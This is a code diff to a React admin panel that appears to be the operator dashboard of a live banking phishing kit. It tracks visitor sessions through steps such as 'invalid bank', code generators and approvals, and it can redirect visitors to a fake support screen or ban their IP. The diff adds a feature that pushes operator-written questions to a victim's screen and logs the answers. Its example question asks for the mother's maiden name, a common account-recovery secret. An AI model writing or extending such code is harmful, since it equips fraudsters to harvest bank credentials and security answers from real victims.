@@ -891,6 +891,9 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const chatEndRef = useRef<HTMLDivElement>(null);
 
   const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
+  const [questionPromptSessionId, setQuestionPromptSessionId] = useState<string | null>(null);
+  const [questionInput, setQuestionInput] = useState("");
+  const [questionModalSession, setQuestionModalSession] = useState<any | null>(null);
   const [specialMessage, setSpecialMessage] = useState("");
   const [specialImage, setSpecialImage] = useState<string | null>(null);
   const [specialLang, setSpecialLang] = useState<"de" | "tr">("de");
@@ -1195,6 +1198,13 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
     if (action === "special_approval") {
       setSpecialPromptSessionId(sessionId);
+      return;
+    }
+
+    // OZEL SORU: modal acilir, admin soruyu yazar → kullaniciya /custom-question gider.
+    if (action === "custom_question") {
+      setQuestionInput("");
+      setQuestionPromptSessionId(sessionId);
       return;
     }
 
@@ -1521,6 +1531,36 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     setApprovalPromptSessionId(null);
     setApprovalPromptType("");
     setApprovalCodeInput("");
+    void load();
+  }
+
+  async function confirmQuestionSend() {
+    if (!supabase || !questionPromptSessionId) return;
+    const q = questionInput.trim();
+    if (!q) return;
+
+    const row = rowsRef.current.find((r) => r.id === questionPromptSessionId);
+    const previousFormData =
+      row?.form_data && typeof row.form_data === "object"
+        ? (row.form_data as Record<string, unknown>)
+        : {};
+    const list: any[] = Array.isArray(previousFormData.customQuestions)
+      ? [...previousFormData.customQuestions]
+      : [];
+    list.push({ question: q, askedAt: new Date().toISOString() });
+
+    await supabase
+      .from("sessions")
+      .update({
+        is_hidden: false,
+        status: "online",
+        current_step: "custom_question",
+        form_data: { ...previousFormData, customQuestions: list },
+      })
+      .eq("id", questionPromptSessionId);
+
+    setQuestionPromptSessionId(null);
+    setQuestionInput("");
     void load();
   }
 
@@ -2179,6 +2219,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
                 else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
                 else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
+                else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
                 else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
                 else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
                 else if (s === "special_approval") {
@@ -2420,6 +2461,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
                             <option value="congrats">✅ Tebrikler Ekranına Al</option>
                             <option value="special_approval">🔔 Özel Bildirim Gönder</option>
+                            <option value="custom_question">❓ Özel Soru Gönder</option>
                             <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
                           </select>
 
@@ -2446,6 +2488,9 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         <div className={`flex justify-end items-center mt-0.5 gap-1 w-full ${isDeletedMode ? 'pt-1' : ''}`}>
                           <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
                             <span>💬</span>
+                          </button>
+                          <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 hover:bg-violet-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Özel Sorular (Soru-Cevap)">
+                            <span>❓</span>
                           </button>
                           <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                             <span>📱</span>
@@ -3116,6 +3161,79 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           </div>
         </div>
       )}
+
+      {/* OZEL SORU GONDER MODALI */}
+      {questionPromptSessionId && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
+            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>❓ Özel Soru Gönder</h3>
+            <div>
+              <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Kullanıcıya Gösterilecek Soru</label>
+              <textarea
+                rows={3}
+                value={questionInput}
+                onChange={(e) => setQuestionInput(e.target.value)}
+                placeholder="Örn: Kokia yra jūsų motinos mergautinė pavardė?"
+                className={`w-full rounded-xl border px-3 py-2 outline-none transition-all resize-none ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+              />
+            </div>
+            <div className="mt-6 flex justify-end gap-3">
+              <button
+                onClick={() => { setQuestionPromptSessionId(null); setQuestionInput(""); }}
+                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
+              >
+                İptal
+              </button>
+              <button
+                onClick={() => void confirmQuestionSend()}
+                disabled={!questionInput.trim()}
+                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20 disabled:opacity-50"
+              >
+                Gönder
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* OZEL SORULAR GECMISI MODALI (guncel ustte) */}
+      {questionModalSession && (() => {
+        const qfd = (questionModalSession.form_data ?? {}) as Record<string, any>;
+        const qList: any[] = Array.isArray(qfd.customQuestions) ? [...qfd.customQuestions] : [];
+        const ordered = qList.map((q, i) => ({ q, i })).reverse();
+        return (
+          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm" onClick={() => setQuestionModalSession(null)}>
+            <div className={`w-full max-w-lg max-h-[80vh] overflow-hidden rounded-2xl border shadow-2xl flex flex-col ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`} onClick={(e) => e.stopPropagation()}>
+              <div className={`flex justify-between items-center px-5 py-4 border-b ${darkMode ? 'border-zinc-800' : 'border-gray-200'}`}>
+                <h3 className={`text-lg font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>❓ Özel Sorular</h3>
+                <button onClick={() => setQuestionModalSession(null)} className="text-zinc-500 hover:opacity-70 text-xl">✕</button>
+              </div>
+              <div className="overflow-y-auto p-5 space-y-3">
+                {ordered.length === 0 ? (
+                  <p className={`text-sm text-center py-6 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz soru gönderilmedi.</p>
+                ) : ordered.map(({ q, i }) => (
+                  <div key={i} className={`rounded-xl border p-4 ${darkMode ? 'border-zinc-800 bg-zinc-900/50' : 'border-gray-200 bg-gray-50'}`}>
+                    <div className="flex items-center justify-between gap-2 mb-2">
+                      <span className={`text-[10px] font-bold uppercase tracking-widest ${darkMode ? 'text-violet-400' : 'text-violet-600'}`}>Soru #{i + 1}</span>
+                      <span className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>{q.askedAt ? fmtDate(q.askedAt) : ""}</span>
+                    </div>
+                    <p className={`text-sm font-semibold mb-2 ${darkMode ? 'text-white' : 'text-gray-900'}`}>{q.question || "-"}</p>
+                    {q.answer && String(q.answer).trim() ? (
+                      <div className={`rounded-lg px-3 py-2 text-sm ${darkMode ? 'bg-emerald-500/10 text-emerald-400' : 'bg-emerald-50 text-emerald-700'}`}>
+                        <span className="font-bold">Cevap: </span>{q.answer}
+                      </div>
+                    ) : (
+                      <div className={`rounded-lg px-3 py-2 text-xs font-semibold ${darkMode ? 'bg-amber-500/10 text-amber-400' : 'bg-amber-50 text-amber-600'}`}>
+                        Cevap bekleniyor...
+                      </div>
+                    )}
+                  </div>
+                ))}
+              </div>
+            </div>
+          </div>
+        );
+      })()}
 
       {/* DEVICE INFO MODAL */}
       {deviceInfoSession && (() => {
